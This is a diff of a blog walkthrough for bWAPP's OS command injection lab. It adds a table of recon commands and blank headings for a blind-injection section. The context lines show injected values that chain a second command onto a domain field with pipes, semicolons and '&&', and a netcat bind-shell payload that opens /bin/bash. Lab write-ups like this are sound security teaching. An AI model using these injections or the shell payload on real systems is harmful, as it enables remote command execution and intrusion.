@@ -185,6 +185,15 @@ This is using `htmlspecialchars()` function which restricts the use of HTML spec
 ---
 <h3>Security Level: low</h3>
 OS command injections comes into play when the code is requesting the commandline to run a command,so we can alter the requested command and provide the malicious query.
+<b>Some useful commands to check for OS vulnerability:-</b>
+| Purpose of command | Linux | Windows |
+| ------------------ | ----- | ------- |
+| Name of current user | whoami | whoami |
+| Operating system | uname -a | ver |
+| Network configuration | ifconfig | ipconfig /all |
+| Network connections | netstat -an	netstat -an |
+| Running processes | ps -ef | tasklist |
+
 Here it is using the <code>shell_exec("nslookup  " . commandi($target))</code> nslookup tool to find the DNS record of the provided domain.
 
 ![OS commmand injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_easy_1.png)
@@ -195,8 +204,7 @@ Since it is passing the command ```nslookup www.www.nsa.gov ``` to the commadlin
 
 Here we used the ```www.nsa.gov | time ```
 we can even use other commands such as
-```www.nsa.gov ; time ```
-```www.nsa.gov && time ```
+```www.nsa.gov ; time ```  or ```www.nsa.gov && time ```
 
 The OS Command injection can sometime be very mailcious as we can even get a remote shell by using the command:
 ```www.nsa.gov ; nc -vlp 1234 -e /bin/bash ```
@@ -212,6 +220,14 @@ As the function used by the server blocks the use of '&' and ; but we can use pi
 <h3>Security Level: high</h3>
 
 Here they are using ```escapeshellcmd(); ``` function which ensure that user execute only one command user can specify unlimited number of parameters user cannot execute different command. This was exploitable in the earlier versions of PHP. Read more [HERE](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection)
+
+## OS Command Injection - Blind
+---
+<h3>Security Level: low</h3>
+
+<h3>Security Level: medium</h3>
+
+<h3>Security Level: high</h3>
 
 All SQL challanges are covered in PART II of A1-Injection.<br>
 <i>Thanks for your patience, I hope you enjoyed reading. Happy Hacking... </i>
